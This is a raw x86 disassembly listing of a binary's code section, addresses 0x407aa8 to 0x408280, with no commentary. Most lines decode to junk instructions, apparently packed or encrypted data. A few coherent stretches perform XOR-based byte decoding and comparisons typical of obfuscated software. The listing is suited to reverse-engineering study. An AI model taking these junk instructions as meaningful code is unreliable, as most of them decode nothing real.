  407aa8:	mov    bh,0x86
  407aaa:	pusha  
  407aab:	adc    al,bh
  407aad:	int    0x76
  407aaf:	xchg   edi,ebp
  407ab1:	jae    0x407b0b
  407ab3:	(bad)  
  407ab4:	sbb    edx,edx
  407ab6:	in     eax,dx
  407ab7:	sbb    al,0x1d
  407ab9:	inc    esp
  407aba:	lock dec ebx
  407abc:	shl    BYTE PTR [edx-0xe85a187],cl
  407ac2:	push   cs
  407ac3:	xchg   edx,eax
  407ac4:	enter  0x10de,0xc4
  407ac8:	fcomp  QWORD PTR [edx]
  407aca:	(bad)
  407ace:	scas   eax,DWORD PTR es:[edi]
  407acf:	lods   eax,DWORD PTR ds:[esi]
  407ad0:	push   ebp
  407ad1:	out    dx,al
  407ad2:	out    0x10,eax
  407ad4:	test   dh,al
  407ad6:	pop    ecx
  407ad7:	sub    ebx,DWORD PTR [ebx+eiz*2+0x5f]
  407adb:	cmp    eax,0x1563bb4e
  407ae0:	xchg   edi,eax
  407ae1:	dec    edi
  407ae2:	mov    ebp,0xe07c7933
  407ae8:	pop    ebx
  407ae9:	repnz cs push edi
  407aec:	out    0xfa,al
  407aee:	out    0xce,al
  407af0:	scas   eax,DWORD PTR es:[edi]
  407af1:	fsubp  st(1),st
  407af3:	rcl    DWORD PTR [ebp+0x44564c9c],1
  407af9:	popa   
  407afa:	xchg   ebx,esp
  407afc:	pop    edx
  407afd:	jb     0x407b38
  407aff:	call   0xf8f1:0x760e2536
  407b06:	or     al,0xee
  407b08:	pop    es
  407b09:	xor    edx,DWORD PTR [edi+ebp*8]
  407b0c:	imul   edx,esi,0xfffffffe
  407b0f:	sub    BYTE PTR fs:0xce69fba3,0xf3
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	jle    0x407bc2
  407b4d:	jle    0x407b3e
  407b4f:	jge    0x407b16
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407af8
  407b58:	sbb    ecx,esp
  407b5a:	xchg   esi,eax
  407b5b:	jns    0x407b54
  407b5d:	stos   BYTE PTR es:[edi],al
  407b5e:	outs   dx,DWORD PTR ds:[esi]
  407b5f:	aad    0xbe
  407b61:	shr    BYTE PTR ds:0xb70b684d,cl
  407b67:	pop    ebp
  407b68:	push   0x52
  407b6a:	mov    ebp,ds
  407b6c:	xor    DWORD PTR [ecx+0x15],eax
  407b6f:	jo     0x407b97
  407b71:	repz inc ebx
  407b73:	push   esp
  407b74:	dec    ecx
  407b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b76:	push   es
  407b77:	jmp    0x407afc
  407b79:	lahf   
  407b7a:	iret   
  407b7b:	or     BYTE PTR [eax],bl
  407b7d:	sub    eax,0x902d31fa
  407b82:	and    DWORD PTR [esi],ecx
  407b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b85:	push   es
  407b86:	repz ss dec esi
  407b89:	adc    BYTE PTR [ebp+0x25af5433],bh
  407b8f:	sti    
  407b90:	dec    esi
  407b91:	mov    ebx,0x289c839c
  407b96:	and    al,BYTE PTR [edi-0x6b74bc0a]
  407b9c:	je     0x407b87
  407b9e:	ins    DWORD PTR es:[edi],dx
  407b9f:	cs aad 0x88
  407ba2:	push   ebp
  407ba3:	pushf  
  407ba4:	and    al,0x3e
  407ba6:	jmp    0xfcb84ee2
  407bab:	jl     0x407b58
  407bad:	mov    dh,0x2a
  407baf:	aam    0x1b
  407bb1:	xor    DWORD PTR [ebp-0x7aaf13c0],edi
  407bb7:	(bad)
  407bbc:	sbb    eax,0x40567f2
  407bc1:	and    DWORD PTR [edx],eax
  407bc3:	push   ss
  407bc4:	imul   esi,ecx,0xb579aedc
  407bca:	sbb    al,0xde
  407bcc:	mov    cs,ebp
  407bce:	jmp    0x407b7e
  407bd0:	ss pop ebp
  407bd2:	je     0x407b75
  407bd4:	push   cs
  407bd5:	push   eax
  407bd6:	mov    DWORD PTR [edx],ebp
  407bd8:	dec    ebx
  407bd9:	add    eax,0xd4bd9176
  407bde:	and    esi,ebp
  407be0:	sbb    ecx,edi
  407be2:	imul   edx,eax,0x63f93307
  407be8:	fwait
  407be9:	lods   eax,DWORD PTR ds:[esi]
  407bea:	scas   al,BYTE PTR es:[edi]
  407beb:	in     eax,dx
  407bec:	cdq    
  407bed:	or     DWORD PTR [ebx+0x2063ba4e],edx
  407bf3:	or     DWORD PTR [edx-0x4966a810],ebx
  407bf9:	sbb    DWORD PTR [edi+0x3f],esp
  407bfc:	xchg   dh,cl
  407bfe:	rcl    BYTE PTR [eax],0x3b
  407c01:	dec    ecx
  407c02:	mov    ecx,cs
  407c04:	mov    esp,DWORD PTR [edx+0x22f0acf9]
  407c0a:	add    DWORD PTR [edx],0xffffff80
  407c0d:	adc    dh,BYTE PTR [esi]
  407c0f:	cs mov ecx,0x3aa9fa7b
  407c15:	in     eax,dx
  407c16:	push   ebp
  407c17:	enter  0xb4e4,0x28
  407c1b:	add    BYTE PTR [esi+0x70],dl
  407c1e:	xor    eax,0x8542094d
  407c23:	pop    edi
  407c24:	sub    ecx,esi
  407c26:	sbb    bl,BYTE PTR [edi]
  407c28:	out    0x6b,al
  407c2a:	or     al,0x14
  407c2c:	jp     0x407c51
  407c2e:	outs   dx,DWORD PTR ds:[esi]
  407c2f:	adc    edx,DWORD PTR [ebx-0x46ee072c]
  407c35:	jmp    0x45536abe
  407c3a:	in     al,0x55
  407c3c:	sbb    ebp,ebx
  407c3e:	imul   ecx,edx,0x29
  407c41:	lds    ebx,FWORD PTR ds:0xc33d621b
  407c47:	fcom   st(6)
  407c49:	sbb    BYTE PTR ds:0xbe8def79,bh
  407c4f:	mov    dl,0x71
  407c51:	out    dx,al
  407c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c53:	stc    
  407c54:	aas    
  407c55:	sar    BYTE PTR [esi+0x49],0xeb
  407c59:	dec    esp
  407c5a:	(bad)  
  407c5b:	fisub  WORD PTR [ecx]
  407c5d:	dec    esp
  407c5e:	mov    al,0x50
  407c60:	aam    0xbc
  407c62:	cdq    
  407c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c64:	adc    al,BYTE PTR [ebp+esi*8-0x25ea3e51]
  407c6b:	jae    0x407c38
  407c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c6e:	xor    ch,BYTE PTR [ebx]
  407c70:	mov    dh,0x62
  407c72:	jae    0x407c4e
  407c74:	hlt    
  407c75:	dec    ecx
  407c76:	and    DWORD PTR [ebx-0x65],ebx
  407c79:	pop    edx
  407c7a:	xlat   BYTE PTR ds:[ebx]
  407c7b:	pop    ecx
  407c7c:	pop    eax
  407c7d:	mov    ecx,0xbacac219
  407c82:	sub    ah,BYTE PTR [esi-0x58660bd8]
  407c88:	sbb    eax,0x4c053433
  407c8d:	push   edi
  407c8e:	push   edi
  407c8f:	xchg   esp,eax
  407c90:	test   al,0x13
  407c92:	cli    
  407c93:	xor    BYTE PTR [ecx-0x6a2e882a],al
  407c99:	xchg   esp,eax
  407c9a:	sbb    edx,DWORD PTR [edx]
  407c9c:	adc    eax,0xe3f5e695
  407ca1:	mov    al,0x57
  407ca3:	sti    
  407ca4:	xchg   ebp,eax
  407ca5:	stc    
  407ca6:	xor    al,0x3c
  407ca8:	mov    eax,0x6cfd9935
  407cad:	xchg   edx,eax
  407cae:	lds    esp,FWORD PTR ds:0x8cddc31f
  407cb4:	push   0x510d7115
  407cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cba:	push   ss
  407cbb:	mov    eax,DWORD PTR [ebp-0x8]
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce0:	and    eax,0xc7d11aa8
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407ca1
  407cec:	mov    ds:0x1ab256f,al
  407cf1:	adc    esi,ecx
  407cf3:	adc    eax,0xabd31518
  407cf8:	loope  0x407ccd
  407cfa:	aaa    
  407cfb:	ja     0x407d61
  407cfd:	cmc    
  407cfe:	or     eax,0xe3652b72
  407d03:	xor    ecx,DWORD PTR [ebp+0x5aee582f]
  407d09:	cmp    DWORD PTR [ecx],esp
  407d0b:	sbb    BYTE PTR [ebx+0x6cb84286],dh
  407d11:	dec    edi
  407d12:	jl     0x407d6f
  407d14:	mov    edi,0xf62665a7
  407d19:	cmc    
  407d1a:	or     eax,0xcb0763d9
  407d1f:	mov    ?,WORD PTR [ebx]
  407d21:	repz push eax
  407d23:	push   0xf1b44f9c
  407d28:	test   BYTE PTR [esi+eiz*4-0x19],0x92
  407d2d:	aaa    
  407d2e:	jecxz  0x407d9a
  407d30:	push   es
  407d31:	fld    st(5)
  407d33:	push   0x42133788
  407d38:	add    eax,0xe33c7041
  407d3d:	aad    0xfe
  407d3f:	retf   0x68
  407d42:	pop    esp
  407d43:	add    cl,cl
  407d45:	in     eax,dx
  407d46:	repz enter 0x73a5,0xb6
  407d4b:	in     al,dx
  407d4c:	pop    ss
  407d4d:	cmp    eax,0xe53092fa
  407d52:	aad    0x89
  407d54:	add    ch,bh
  407d56:	pop    ecx
  407d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d58:	inc    esi
  407d59:	mov    ebp,DWORD PTR [ecx*8+0x7b685fc5]
  407d60:	xlat   BYTE PTR ds:[ebx]
  407d61:	leave  
  407d62:	jmp    0x21fb862f
  407d67:	sub    DWORD PTR [eax],edi
  407d69:	mov    ah,0xb8
  407d6b:	sub    BYTE PTR [eax],bh
  407d6d:	inc    eax
  407d6e:	ja     0x407d88
  407d70:	push   ebx
  407d71:	jmp    0x8c09d790
  407d76:	xor    eax,0x1866897f
  407d7b:	bound  edx,QWORD PTR [ebx+0xe938638]
  407d81:	mov    ah,dl
  407d83:	push   cs
  407d84:	rol    edx,1
  407d86:	push   0xfffffff8
  407d88:	or     edx,DWORD PTR [edi-0x15]
  407d8b:	and    al,0x38
  407d8d:	test   al,0xea
  407d8f:	cli    
  407d90:	aaa    
  407d91:	adc    BYTE PTR [esi],ch
  407d93:	(bad)  
  407d94:	daa    
  407d95:	xchg   ah,dh
  407d97:	sbb    BYTE PTR [ecx-0xdcc09ef],ah
  407d9d:	add    eax,DWORD PTR [edi-0x59]
  407da0:	add    eax,DWORD PTR es:[edi]
  407da3:	push   esi
  407da4:	arpl   WORD PTR [ebx+0x43ec0cea],dx
  407daa:	jnp    0x407df0
  407dac:	test   DWORD PTR [ecx+0x61],eax
  407daf:	or     al,0x65
  407db1:	jmp    FWORD PTR [ecx+0x6a]
  407db4:	sub    eax,0xc723a2d2
  407db9:	(bad)  
  407dbb:	pop    edi
  407dbc:	mov    al,0x5c
  407dbe:	sbb    al,0xad
  407dc0:	adc    eax,0xbbc7db3e
  407dc5:	mov    bl,0x17
  407dc7:	xchg   DWORD PTR [ebx-0x5],ebp
  407dca:	out    0x7c,al
  407dcc:	xor    BYTE PTR [ebp+eax*8-0x14],ch
  407dd0:	imul   esi,esp,0xe
  407dd3:	dec    ebx
  407dd4:	sub    BYTE PTR [edi],cl
  407dd6:	pusha  
  407dd7:	int    0xe0
  407dd9:	adc    eax,0x86819148
  407dde:	(bad)  
  407ddf:	xchg   ebp,eax
  407de0:	inc    eax
  407de1:	cmc    
  407de2:	lock sahf 
  407de4:	mov    ds:0xf52a1403,eax
  407de9:	inc    esi
  407dea:	mov    edx,0xac50f939
  407def:	ficom  WORD PTR [edx]
  407df1:	aaa    
  407df2:	pop    es
  407df3:	nop
  407df4:	push   ebp
  407df5:	mov    dh,BYTE PTR [ecx+0x4d4578b6]
  407dfb:	pop    esp
  407dfc:	or     al,cl
  407dfe:	mov    cl,0x53
  407e00:	and    bh,BYTE PTR [ebx]
  407e02:	pop    eax
  407e03:	and    bl,BYTE PTR [edi]
  407e05:	dec    eax
  407e06:	adc    ecx,DWORD PTR [ecx-0x4cc72c59]
  407e0c:	jb     0x407dcc
  407e0e:	push   ds
  407e0f:	clc    
  407e10:	inc    edi
  407e11:	jge    0x407e26
  407e13:	adc    eax,0x5048dc68
  407e18:	test   DWORD PTR [edx-0x16],edx
  407e1b:	loopne 0x407e02
  407e1d:	add    al,0x21
  407e1f:	fldenv [ebp+edi*1-0x76]
  407e23:	sar    DWORD PTR [ebp-0x4a04ca6f],1
  407e29:	jne    0x407dfd
  407e2b:	rcr    BYTE PTR [eax+0x1d],1
  407e2e:	out    dx,eax
  407e2f:	or     al,0xb9
  407e31:	jl     0x407e2c
  407e33:	pop    eax
  407e34:	jnp    0x407eae
  407e36:	lds    ebx,FWORD PTR [esi-0x301c6541]
  407e3c:	push   ebx
  407e3d:	loop   0x407e9b
  407e3f:	fild   DWORD PTR [esi+0x27bcfed1]
  407e45:	iret   
  407e46:	fwait
  407e47:	int    0x4d
  407e49:	jle    0x407e05
  407e4b:	iret   
  407e4c:	sar    BYTE PTR ds:0x8458928,1
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x9d
  407ea7:	int3   
  407ea8:	dec    edx
  407ea9:	es mov ch,0xd8
  407eac:	jle    0x407f2c
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407e99
  407eb3:	add    eax,0x82e47345
  407eb8:	add    eax,0xe128d0c5
  407ebd:	mov    dh,al
  407ebf:	(bad)  
  407ec0:	mov    edx,0x89df25fd
  407ec5:	sar    BYTE PTR [ecx+eax*4+0x15e194a],0x5e
  407ecd:	pop    ecx
  407ece:	jns    0x407e90
  407ed0:	pusha  
  407ed1:	push   edi
  407ed2:	adc    dh,BYTE PTR [edx-0x5d]
  407ed5:	rcl    DWORD PTR [ecx+0x7d670390],0xe
  407edc:	push   ecx
  407edd:	cli    
  407ede:	xor    al,0x23
  407ee0:	xchg   esp,eax
  407ee1:	or     DWORD PTR [edi],eax
  407ee3:	xor    dl,BYTE PTR [ebp+0xc]
  407ee6:	pop    ebx
  407ee7:	shl    BYTE PTR [eax+0x4],1
  407eea:	daa    
  407eeb:	loop   0x407f38
  407eed:	adc    BYTE PTR [eax+0x4a],bl
  407ef0:	push   cs
  407ef1:	stos   BYTE PTR es:[edi],al
  407ef2:	cmp    BYTE PTR [ecx+esi*4-0x23],cl
  407ef6:	sub    al,0x23
  407ef8:	inc    ebx
  407ef9:	rol    DWORD PTR [edx+0x69],1
  407efc:	ror    BYTE PTR [ecx],1
  407efe:	out    dx,eax
  407eff:	clc    
  407f00:	fwait
  407f01:	test   ecx,ebp
  407f03:	mov    eax,0xad07fe84
  407f08:	adc    al,0xf0
  407f0a:	cdq    
  407f0b:	add    al,cl
  407f0d:	push   cs
  407f0e:	retf   0x96ee
  407f11:	jg     0x407f5d
  407f13:	cmp    edi,esi
  407f15:	test   eax,0x184dc7
  407f1a:	outs   dx,DWORD PTR ds:[esi]
  407f1b:	adc    bh,BYTE PTR [edx-0x36]
  407f1e:	mov    al,0x69
  407f20:	cmp    edx,esi
  407f22:	inc    ebp
  407f23:	int    0x3b
  407f25:	(bad)  
  407f26:	es dec eax
  407f28:	int3   
  407f29:	pop    es
  407f2a:	mov    ch,0xb1
  407f2c:	test   al,0x53
  407f2e:	aam    0x7b
  407f30:	mov    edi,0x9aed5013
  407f35:	or     dl,ah
  407f37:	jle    0x407f82
  407f39:	jp     0x407f7c
  407f3b:	inc    edi
  407f3c:	push   0xffffffe2
  407f3e:	in     eax,0x20
  407f40:	(bad)  
  407f42:	(bad)  
  407f43:	mov    bh,0x24
  407f45:	fwait
  407f46:	jl     0x407f4b
  407f48:	idiv   DWORD PTR [esi+0x3c6d12c1]
  407f4e:	scas   al,BYTE PTR es:[edi]
  407f4f:	mov    ch,0x14
  407f51:	ret    
  407f52:	in     al,dx
  407f53:	push   ebx
  407f54:	mov    eax,ds:0x12b983e4
  407f59:	(bad)  
  407f5a:	mov    bh,0x9b
  407f5c:	mov    al,ds:0xd5aaf271
  407f61:	or     eax,DWORD PTR [edx+0x62edac1d]
  407f67:	shl    DWORD PTR [eax+ebp*4-0x3141c15f],0xcd
  407f6f:	daa    
  407f70:	mov    esp,0x4ea09262
  407f75:	jne    0x407fd4
  407f77:	mov    esp,0xe144c245
  407f7c:	daa    
  407f7d:	outs   dx,BYTE PTR ds:[esi]
  407f7e:	(bad)  
  407f7f:	push   esi
  407f80:	jne    0x407fb1
  407f82:	inc    eax
  407f83:	bound  ebp,QWORD PTR [eax]
  407f85:	ja     0x407f1f
  407f87:	movaps xmm0,xmm6
  407f8a:	push   edi
  407f8b:	cli    
  407f8c:	dec    edi
  407f8d:	or     eax,DWORD PTR ds:0x6b863595
  407f93:	jle    0x408005
  407f95:	sahf   
  407f96:	mov    al,ds:0x921974fd
  407f9b:	(bad)  
  407f9d:	sahf   
  407f9e:	arpl   WORD PTR [ecx+0x4172027b],bx
  407fa4:	jno    0x407f49
  407fa6:	add    ch,dh
  407fa8:	fs push ecx
  407faa:	sbb    BYTE PTR [ecx+ebp*8+0x52ab68b2],ch
  407fb1:	mov    esp,0x34390392
  407fb6:	mov    edi,edx
  407fb8:	push   esp
  407fb9:	mov    cl,0x43
  407fbb:	nop
  407fbc:	inc    eax
  407fbd:	cs mov edi,0x265c44a
  407fc3:	push   eax
  407fc4:	pop    eax
  407fc5:	add    eax,0x1f78e1e5
  407fca:	stos   DWORD PTR es:[edi],eax
  407fcb:	dec    esi
  407fcc:	inc    eax
  407fcd:	popa   
  407fce:	pop    eax
  407fcf:	and    eax,0xfe58f6
  407fd4:	cmp    eax,0x3814ceaa
  407fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fda:	das    
  407fdb:	ret    0xe347
  407fde:	inc    ecx
  407fdf:	int3   
  407fe0:	iret   
  407fe1:	push   edx
  407fe2:	mov    ds:0xa6eff04a,al
  407fe7:	scas   al,BYTE PTR es:[edi]
  407fe8:	retf   
  407fe9:	ds jmp 0xdbcd:0x4446c46d
  407ff1:	sbb    edi,ebp
  407ff3:	retf   
  407ff4:	xor    esp,edx
  407ff6:	xor    DWORD PTR [edx+ebp*4],esi
  407ff9:	sub    al,0xce
  407ffb:	test   al,0x24
  407ffd:	ds add al,0x39
  408000:	sbb    DWORD PTR [ecx-0x5d8dfdd7],edi
  408006:	ret    0x456c
  408009:	sar    DWORD PTR [ebp+edi*2+0x70fd795],1
  408010:	sbb    DWORD PTR [eax+ebx*8-0x760f7510],0x458bec45
  40801b:	in     al,dx
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x7c734c80],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x408094
  408040:	mov    eax,esi
  408042:	aas    
  408043:	push   esi
  408044:	shr    BYTE PTR [edi-0x5ab2500],0x77
  40804b:	sbb    al,0xa6
  40804d:	or     DWORD PTR [edx+0x7734dc6b],ecx
  408053:	punpckhdq mm5,QWORD PTR [edx+0x7d525279]
  40805a:	je     0x40801b
  40805c:	add    al,BYTE PTR [eax+0x5d]
  40805f:	les    edi,FWORD PTR [ecx]
  408061:	nop
  408062:	adc    al,0xbf
  408064:	inc    esp
  408065:	mov    esi,0x4a83b87a
  40806a:	pop    ecx
  40806b:	aas    
  40806c:	xor    eax,0x538cf02b
  408071:	xchg   ecx,eax
  408072:	adc    BYTE PTR [edi+0x52cd8465],0xcd
  408079:	inc    edi
  40807a:	les    ecx,FWORD PTR [ebx-0x72ea5b9]
  408080:	mov    ecx,0xb4f5286e
  408085:	or     dl,cl
  408087:	outs   dx,DWORD PTR ds:[esi]
  408088:	out    0xa7,eax
  40808a:	stc    
  40808b:	inc    esi
  40808c:	hlt    
  40808d:	mov    cl,0x58
  40808f:	mov    dh,BYTE PTR [ebx+esi*1-0x792a020c]
  408096:	es push cs
  408098:	and    cl,BYTE PTR [edx+0x23]
  40809b:	pop    ebp
  40809c:	cs pop edi
  40809e:	in     eax,0xef
  4080a0:	add    BYTE PTR [edx+0x3dd074a8],ah
  4080a6:	mov    dh,0xb4
  4080a8:	cmp    bh,BYTE PTR [ecx]
  4080aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ab:	ss xchg ebx,eax
  4080ad:	arpl   WORD PTR [esi-0x2abcce60],dx
  4080b3:	mov    ch,0x57
  4080b5:	retf   
  4080b6:	sub    dl,BYTE PTR [eax+0x7c]
  4080b9:	test   al,0xe4
  4080bb:	movd   eax,mm6
  4080be:	imul   ecx,DWORD PTR [ecx],0x726fed8d
  4080c4:	in     al,0xf
  4080c6:	bnd jb 0x40805b
  4080c9:	sub    BYTE PTR [edx],al
  4080cb:	sub    bl,al
  4080cd:	or     ch,dl
  4080cf:	xchg   DWORD PTR [esi],esi
  4080d1:	popa   
  4080d2:	mov    ?,ebp
  4080d4:	int3   
  4080d5:	add    BYTE PTR [ebx+ebx*8-0x5e],dh
  4080d9:	and    eax,0xb54e2c0d
  4080de:	inc    edi
  4080df:	adc    BYTE PTR [ebx],ch
  4080e1:	xor    al,0xd5
  4080e3:	push   eax
  4080e4:	mov    edi,0x191e8c4
  4080e9:	mov    bh,0xb7
  4080eb:	sub    dl,bh
  4080ed:	shl    DWORD PTR [edx+0x40e8e5b6],1
  4080f3:	clc    
  4080f4:	sti    
  4080f5:	cdq    
  4080f6:	add    eax,0xfe458d25
  4080fb:	pushf  
  4080fc:	inc    ebx
  4080fd:	outs   dx,DWORD PTR ds:[esi]
  4080fe:	mov    dh,0x6b
  408100:	push   esi
  408101:	mov    ebp,0xf205358
  408106:	add    BYTE PTR [ecx+0x5708b2e],0xc0
  40810d:	fcmovb st,st(5)
  40810f:	jle    0x408126
  408111:	arpl   sp,ax
  408113:	fdiv   st(3),st
  408115:	rcr    BYTE PTR [ebx+edi*4+0x73a28ace],1
  40811c:	push   ebx
  40811d:	stos   BYTE PTR es:[edi],al
  40811e:	push   ds
  40811f:	pusha  
  408120:	int3   
  408121:	mov    eax,ds:0x27e41966
  408126:	gs sub eax,0xf26fc419
  40812c:	retf   0xc7dd
  40812f:	addr16 fchs 
  408132:	xchg   edi,eax
  408133:	cmc    
  408134:	mov    WORD PTR [eax+0x5d],gs
  408137:	cmc    
  408138:	mov    ch,al
  40813a:	js     0x408179
  40813c:	cmp    ecx,DWORD PTR [ecx+0x482ab82]
  408142:	loopne 0x4080ce
  408144:	cld    
  408145:	in     eax,0x9a
  408147:	outs   dx,DWORD PTR ds:[esi]
  408148:	in     eax,0x47
  40814a:	xor    DWORD PTR [esi-0x12],0x7a6c4c92
  408151:	add    edx,edi
  408153:	jae    0x40817c
  408155:	sbb    eax,0x226e2e5
  40815a:	dec    esp
  40815b:	push   edx
  40815c:	(bad)  
  40815d:	mov    ds:0x3192e76d,al
  408162:	xchg   edi,eax
  408163:	inc    eax
  408164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408165:	cwde   
  408166:	shl    ecx,1
  408168:	in     eax,dx
  408169:	fs pop eax
  40816b:	dec    ebx
  40816c:	enter  0xd285,0xd6
  408170:	jae    0x40819f
  408172:	shl    edx,1
  408174:	dec    esp
  408175:	popa   
  408176:	jmp    0xf573:0xf9e30cfc
  40817d:	jp     0x40818c
  40817f:	bound  ebp,QWORD PTR [ecx+0x45]
  408182:	leave  
  408183:	jno    0x4081b1
  408185:	in     al,dx
  408186:	mov    BYTE PTR [eax-0x2a37b560],bl
  40818c:	test   DWORD PTR [eax-0x527b78ad],ebx
  408192:	push   edx
  408193:	push   cs
  408194:	lahf   
  408195:	in     al,0x2c
  408197:	imul   eax,DWORD PTR [ecx],0xb
  40819a:	add    cl,BYTE PTR [esi-0x4b]
  40819d:	sbb    DWORD PTR [edx+0x2f],eax
  4081a0:	add    esi,DWORD PTR [ebx-0xfba74ab]
  4081a6:	mov    edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0x43c82a71]
  4081bf:	mov    cl,BYTE PTR [ebp-0x2d818125]
  4081c5:	jg     0x408245
  4081c7:	jle    0x408243
  4081c9:	ret    
  4081ca:	rcr    DWORD PTR [ebp-0x75f8d5b0],cl
  4081d0:	mov    edi,gs
  4081d2:	push   ebp
  4081d3:	or     cl,ah
  4081d5:	adc    eax,DWORD PTR [eax]
  4081d7:	repnz add BYTE PTR [ebp+0x14],0xd7
  4081dc:	fs add edi,edi
  4081df:	scas   al,BYTE PTR es:[edi]
  4081e0:	in     al,0x18
  4081e2:	mov    ebx,0xdb27fd31
  4081e7:	popa   
  4081e8:	popa   
  4081e9:	call   0x990d8b3
  4081ee:	es jne 0x4081ac
  4081f1:	push   ss
  4081f2:	hlt    
  4081f3:	sbb    ebx,ebp
  4081f5:	inc    ecx
  4081f6:	push   ds
  4081f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f8:	nop
  4081f9:	mov    WORD PTR [ebx-0x63],es
  4081fc:	jnp    0x40826c
  4081fe:	add    edx,DWORD PTR [esi]
  408200:	cwde   
  408201:	(bad)  
  408203:	push   es
  408204:	addr16 cmp edx,ebp
  408207:	popa   
  408208:	(bad)  
  408209:	mov    ebx,0xa553550d
  40820e:	in     eax,0x47
  408210:	push   ebx
  408211:	retf   0xdc10
  408214:	mov    ch,0x66
  408216:	popa   
  408217:	mov    al,0x1f
  408219:	sbb    dl,dh
  40821b:	inc    edx
  40821c:	fdivr  st(2),st
  40821e:	cld    
  40821f:	mov    cl,0xfe
  408221:	add    eax,0x312db3e1
  408226:	(bad)  
  408227:	pop    ss
  408228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408229:	sti    
  40822a:	jecxz  0x408238
  40822c:	xor    DWORD PTR [ecx+ebx*2-0x67873b4b],eax
  408233:	ret    
  408234:	sbb    al,0x71
  408236:	mov    edx,esi
  408238:	and    al,0x37
  40823a:	add    al,0xec
  40823c:	sti    
  40823d:	and    eax,0xff593b4f
  408242:	dec    ebx
  408243:	outs   dx,BYTE PTR ds:[esi]
  408244:	xchg   edi,eax
  408245:	or     DWORD PTR [edi],edx
  408247:	test   DWORD PTR [ebx+0x60],esi
  40824a:	stos   BYTE PTR es:[edi],al
  40824b:	push   ds
  40824c:	sub    eax,0xcc4c9af9
  408251:	add    ebx,DWORD PTR [edi+0x26]
  408254:	(bad)  
  408255:	cmp    eax,DWORD PTR [edi+0x34a3f689]
  40825b:	sbb    ch,cl
  40825d:	lods   eax,DWORD PTR ds:[esi]
  40825e:	sub    dl,BYTE PTR [ebp-0x7ac0c18d]
  408264:	adc    DWORD PTR [ebx+0x36],edx
  408267:	push   eax
  408268:	pop    es
  408269:	loope  0x408220
  40826b:	fild   WORD PTR [eax]
  40826d:	lods   al,BYTE PTR ds:[esi]
  40826e:	not    bh
  408270:	bound  esp,QWORD PTR [esi+0x24]
  408273:	je     0x4082b3
  408275:	push   edi
  408276:	mov    edi,0xadaf772e
  40827b:	stos   DWORD PTR es:[edi],eax
  40827c:	enter  0x88ae,0xf9
  408280:	test   dh,bl
